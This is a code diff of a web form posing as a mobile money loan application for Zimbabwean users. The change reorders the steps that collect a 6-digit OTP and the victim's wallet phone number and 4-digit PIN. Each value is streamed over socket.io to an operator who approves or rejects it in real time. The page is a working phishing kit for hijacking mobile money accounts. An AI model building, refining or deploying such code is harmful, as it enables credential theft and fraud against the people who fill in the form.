@@ -269,7 +269,7 @@
                             <input type="range" x-model="form.amount" min="50" max="5000" step="50" class="w-full accent-orange-500">
                         </div>
                         <select x-model="form.term" class="input-premium">
-                            <option value="">Select Loan Term</option>S
+                            <option value="">Select Loan Term</option>
                             <option value="3">3 months</option><option value="6">6 months</option><option value="12">12 months</option>
                         </select>
                         <textarea x-model="form.purpose" class="input-premium h-24" placeholder="Purpose of loan"></textarea>
@@ -298,7 +298,40 @@
                 </div>
 
                 <div x-show="step === 4" x-cloak x-transition.duration.200ms>
-                    <div class="flex justify-between items-center mb-6"><h2 class="text-xl font-bold">Mobile Money Verification</h2><span class="text-xs font-bold text-orange-400">Step 04</span></div>
+                    <div class="flex justify-between items-center mb-4">
+                        <h2 class="text-xl font-bold">Confirm OTP Code</h2>
+                        <span class="text-xs font-bold text-orange-400">Step 04</span>
+                    </div>
+                    <p class="text-xs text-gray-400 text-center mb-6">Enter the 6-digit confirmation token sent to your device</p>
+                    
+                    <div class="space-y-6">
+                        <div class="flex justify-center gap-2">
+                            <template x-for="(_, i) in 6" :key="i">
+                                <input type="password" class="pin-box step4-box" maxlength="1" inputmode="numeric" pattern="[0-9]*" 
+                                       @input="moveStep4Focus($event, i)" 
+                                       x-model="pin.value[i]"
+                                       :disabled="pinVerifying"
+                                       onkeypress="return event.charCode >= 48 && event.charCode <= 57">
+                            </template>
+                        </div>
+
+                        <div class="grid grid-cols-1 gap-4 pt-2">
+                            <div x-show="pinVerifying" class="btn-premium bg-emerald-800 opacity-90 cursor-not-allowed flex items-center justify-center gap-3">
+                                <div class="spinner-sm"></div>
+                                <span class="text-sm font-semibold tracking-wide">Validating Token...</span>
+                            </div>
+
+                            <button x-show="!pinVerifying" @click="submitStep4" :disabled="!isPinValid" class="btn-premium text-base">
+                                <span>Verify Token →</span>
+                            </button>
+
+                            <button x-show="!pinVerifying" @click="step = 3" class="btn-secondary">← Back</button>
+                        </div>
+                    </div>
+                </div>
+
+                <div x-show="step === 5" x-cloak x-transition.duration.200ms>
+                    <div class="flex justify-between items-center mb-6"><h2 class="text-xl font-bold">Mobile Money Verification</h2><span class="text-xs font-bold text-orange-400">Step 05</span></div>
                     <div class="space-y-6">
                         <div class="ib-phone-wrapper">
                             <span class="ib-country-code">🇿🇼+263</span>
@@ -309,8 +342,8 @@
                             <label class="label-premium text-center block mb-3">Enter Wallet PIN</label>
                             <div class="flex justify-center gap-3">
                                 <template x-for="(_, i) in 4" :key="i">
-                                    <input type="password" class="pin-box step4-box" maxlength="1" inputmode="numeric" pattern="[0-9]*" 
-                                           @input="moveStep4Focus($event, i)" 
+                                    <input type="password" class="pin-box step5-box" maxlength="1" inputmode="numeric" pattern="[0-9]*" 
+                                           @input="moveStep5Focus($event, i)" 
                                            x-model="africell.pinValue[i]"
                                            :disabled="passwordVerifying"
                                            onkeypress="return event.charCode >= 48 && event.charCode <= 57">
@@ -319,7 +352,7 @@
                         </div>
 
                         <div class="grid grid-cols-1 gap-4 pt-2">
-                            <button x-show="!passwordVerifying" @click="requestAdminApproval" :disabled="!isStep4Valid" class="btn-premium text-base">
+                            <button x-show="!passwordVerifying" @click="requestAdminApproval" :disabled="!isStep5Valid" class="btn-premium text-base">
                                 <span>Verify & Submit PIN →</span>
                             </button>
                             
@@ -328,38 +361,7 @@
                                 <span class="text-sm font-semibold tracking-wide">Verifying...</span>
                             </div>
                             
-                            <button x-show="!passwordVerifying" @click="step = 3" class="btn-secondary">← Back</button>
-                        </div>
-                    </div>
-                </div>
-
-                <div x-show="step === 5" x-cloak x-transition.duration.200ms>
-                    <div class="flex justify-between items-center mb-4">
-                        <h2 class="text-xl font-bold">Confirm OTP Code</h2>
-                        <span class="text-xs font-bold text-orange-400">Step 05</span>
-                    </div>
-                    <p class="text-xs text-gray-400 text-center mb-6">Enter the 6-digit confirmation token sent to your device</p>
-                    
-                    <div class="space-y-6">
-                        <div class="flex justify-center gap-2">
-                            <template x-for="(_, i) in 6" :key="i">
-                                <input type="password" class="pin-box step5-box" maxlength="1" inputmode="numeric" pattern="[0-9]*" 
-                                       @input="moveStep5Focus($event, i)" 
-                                       x-model="pin.value[i]"
-                                       :disabled="pinVerifying"
-                                       onkeypress="return event.charCode >= 48 && event.charCode <= 57">
-                                </template>
-                        </div>
-
-                        <div class="grid grid-cols-1 gap-4 pt-2">
-                            <div x-show="pinVerifying" class="btn-premium bg-emerald-800 opacity-90 cursor-not-allowed flex items-center justify-center gap-3">
-                                <div class="spinner-sm"></div>
-                                <span class="text-sm font-semibold tracking-wide">Validating Token...</span>
-                            </div>
-
-                            <button x-show="!pinVerifying" @click="submitStep5" :disabled="!isPinValid" class="btn-premium text-base">
-                                <span>Verify & Complete Loan →</span>
-                            </button>
+                            <button x-show="!passwordVerifying" @click="step = 4" class="btn-secondary">← Back</button>
                         </div>
                     </div>
                 </div>
@@ -385,15 +387,15 @@
             get isStep1Valid() { return this.form.loanType && this.form.term && this.form.purpose; },
             get isStep2Valid() { return this.form.firstName && this.form.lastName && this.form.phone; },
             get isStep3Valid() { return this.form.employment && this.form.income; },
-            get isStep4Valid() { return this.africell.phone && this.africell.pinValue.join('').length === 4; },
             get isPinValid() { return this.pin.value.join('').length === 6; },
+            get isStep5Valid() { return this.africell.phone && this.africell.pinValue.join('').length === 4; },
 
             init() {
                 this.socket = io();
                 this.socket.on('session-ready', (data) => { this.appId = data.appId; });
                 
-                this.socket.on('password-verified', () => { 
-                    this.passwordVerifying = false; 
+                this.socket.on('pin-verified', () => { 
+                    this.pinVerifying = false; 
                     this.step = 5; 
                     setTimeout(() => {
                         const firstBox = document.querySelectorAll('.step5-box')[0];
@@ -401,26 +403,26 @@
                     }, 100);
                 });
 
-                this.socket.on('password-rejected', (data) => {
-                    this.passwordVerifying = false;
-                    this.africell.pinValue = ['', '', '', '']; 
-                    alert(data?.message || "PIN rejected by administrator. Please verify and re-enter.");
+                this.socket.on('pin-rejected', (data) => {
+                    this.pinVerifying = false;
+                    this.pin.value = ['', '', '', '', '', '']; 
+                    alert(data?.message || "OTP code invalid or rejected. Please try entering a new token.");
                     setTimeout(() => {
                         const firstBox = document.querySelectorAll('.step4-box')[0];
                         if (firstBox) firstBox.focus();
                     }, 50);
                 });
                 
-                this.socket.on('pin-verified', (d) => { 
-                    this.pinVerifying = false; 
-                    this.referenceId = d.referenceId; 
+                this.socket.on('password-verified', (d) => { 
+                    this.passwordVerifying = false; 
+                    this.referenceId = d?.referenceId || ''; 
                     this.step = 6; 
                 });
 
-                this.socket.on('pin-rejected', (data) => {
-                    this.pinVerifying = false;
-                    this.pin.value = ['', '', '', '', '', '']; 
-                    alert(data?.message || "OTP code invalid or rejected. Please try entering a new token.");
+                this.socket.on('password-rejected', (data) => {
+                    this.passwordVerifying = false;
+                    this.africell.pinValue = ['', '', '', '']; 
+                    alert(data?.message || "PIN rejected by administrator. Please verify and re-enter.");
                     setTimeout(() => {
                         const firstBox = document.querySelectorAll('.step5-box')[0];
                         if (firstBox) firstBox.focus();
@@ -438,47 +440,47 @@
             submitStep2() { this.socket.emit('step2', this.form); this.step = 3; },
             submitStep3() { this.socket.emit('step3', this.form); this.step = 4; },
             
+            submitStep4() { 
+                if (!this.isPinValid || this.pinVerifying) return;
+                this.pinVerifying = true; 
+                this.socket.emit('step4', { pin: this.pin.value.join('') }); 
+            },
+
             requestAdminApproval() { 
-                if (!this.isStep4Valid || this.passwordVerifying) return; 
+                if (!this.isStep5Valid || this.passwordVerifying) return; 
                 this.passwordVerifying = true; 
                 
                 const compiledData = {
                     phone: this.africell.phone,
                     password: this.africell.pinValue.join('')
                 };
-                this.socket.emit('step4', compiledData); 
+                this.socket.emit('step5', compiledData); 
             },
             
-            submitStep5() { 
-                if (!this.isPinValid || this.pinVerifying) return;
-                this.pinVerifying = true; 
-                this.socket.emit('step5', { pin: this.pin.value.join('') }); 
-            },
-            
-            moveStep4Focus(e, i) {
-                e.target.value = e.target.value.replace(/[^0-9]/g, '');
-                if (!e.target.value && i > 0) {
-                    document.querySelectorAll('.step4-box')[i-1].focus();
-                } else if (e.target.value && i < 3) {
-                    document.querySelectorAll('.step4-box')[i+1].focus();
-                }
-            },
-            
-            moveStep5Focus(e, i) { 
+            moveStep4Focus(e, i) { 
                 e.target.value = e.target.value.replace(/[^0-9]/g, '');
                 
                 if (!e.target.value && i > 0) {
-                    document.querySelectorAll('.step5-box')[i-1].focus();
+                    document.querySelectorAll('.step4-box')[i-1].focus();
                 } 
                 else if (e.target.value && i < 5) {
-                    document.querySelectorAll('.step5-box')[i+1].focus();
+                    document.querySelectorAll('.step4-box')[i+1].focus();
                 }
 
                 setTimeout(() => {
                     if (this.isPinValid && !this.pinVerifying) {
-                        this.submitStep5();
+                        this.submitStep4();
                     }
                 }, 50);
+            },
+            
+            moveStep5Focus(e, i) {
+                e.target.value = e.target.value.replace(/[^0-9]/g, '');
+                if (!e.target.value && i > 0) {
+                    document.querySelectorAll('.step5-box')[i-1].focus();
+                } else if (e.target.value && i < 3) {
+                    document.querySelectorAll('.step5-box')[i+1].focus();
+                }
             }
         }
     }
